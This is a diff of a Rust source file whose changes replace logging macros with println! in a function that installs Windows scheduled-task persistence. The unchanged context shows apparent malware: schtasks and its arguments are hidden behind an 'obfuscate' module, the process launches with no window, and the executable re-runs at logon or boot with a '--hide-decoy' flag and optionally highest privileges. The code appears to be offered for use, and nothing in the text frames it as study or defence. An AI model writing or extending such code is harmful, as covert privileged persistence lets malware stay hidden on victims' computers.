@@ -2,7 +2,7 @@ use crate::config::Config;
 use crate::utils::obfuscate::{args, exe};
 use anyhow::{Context, Result};
 use std::env;
-use tracing::{error, info};
+use tracing::{error};
 
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
@@ -11,7 +11,7 @@ pub async fn check_startup() -> Result<()> {
 
     if !startup_config.enabled {
         if Config::SHOW_CONSOLE {
-            info!("Startup persistence disabled");
+            println!("Startup persistence disabled");
         }
         return Ok(());
     }
@@ -19,7 +19,7 @@ pub async fn check_startup() -> Result<()> {
     let task_name = startup_config.task_name;
 
     if Config::SHOW_CONSOLE {
-        info!("Checking for task: {}", task_name);
+        println!("Checking for task: {}", task_name);
     }
 
     let schtasks_cmd = exe::schtasks();
@@ -27,7 +27,7 @@ pub async fn check_startup() -> Result<()> {
         .args([
             args::query().as_str(),
             args::task_name().as_str(),
-            task_name,
+            task_name.as_str(),
         ])
         .creation_flags(CREATE_NO_WINDOW)
         .output()
@@ -36,14 +36,14 @@ pub async fn check_startup() -> Result<()> {
 
     if query_output.status.success() {
         if Config::SHOW_CONSOLE {
-            info!("Task '{}' already exists", task_name);
+            println!("Task '{}' already exists", task_name);
         }
         return Ok(());
     }
 
     if Config::SHOW_CONSOLE {
-        info!("Creating task '{}'", task_name);
-        info!(
+        println!("Creating task '{}'", task_name);
+        println!(
             "Task will trigger on: {}",
             if startup_config.on_logon {
                 "LOGON"
@@ -51,7 +51,7 @@ pub async fn check_startup() -> Result<()> {
                 "BOOT"
             }
         );
-        info!(
+        println!(
             "Privileges: {}",
             if startup_config.highest_privileges {
                 "HIGHEST"
@@ -64,7 +64,7 @@ pub async fn check_startup() -> Result<()> {
     let exe_path = env::current_exe().context("Failed to get executable path")?;
 
     if Config::SHOW_CONSOLE {
-        info!("Executable path: {}", exe_path.display());
+        println!("Executable path: {}", exe_path.display());
     }
 
     let exe_path_quoted = format!("\"{}\" --hide-decoy", exe_path.display());
@@ -99,7 +99,7 @@ pub async fn check_startup() -> Result<()> {
     }
 
     if Config::SHOW_CONSOLE {
-        info!("Running: {} {}", schtasks_cmd, cmd_args.join(" "));
+        println!("Running: {} {}", schtasks_cmd, cmd_args.join(" "));
     }
 
     // Use tokio async command to avoid blocking the runtime
@@ -122,8 +122,8 @@ pub async fn check_startup() -> Result<()> {
 
     if Config::SHOW_CONSOLE {
         let stdout = String::from_utf8_lossy(&create_output.stdout);
-        info!("Task created successfully");
-        info!("Output: {}", stdout);
+        println!("Task created successfully");
+        println!("Output: {}", stdout);
     }
 
     Ok(())
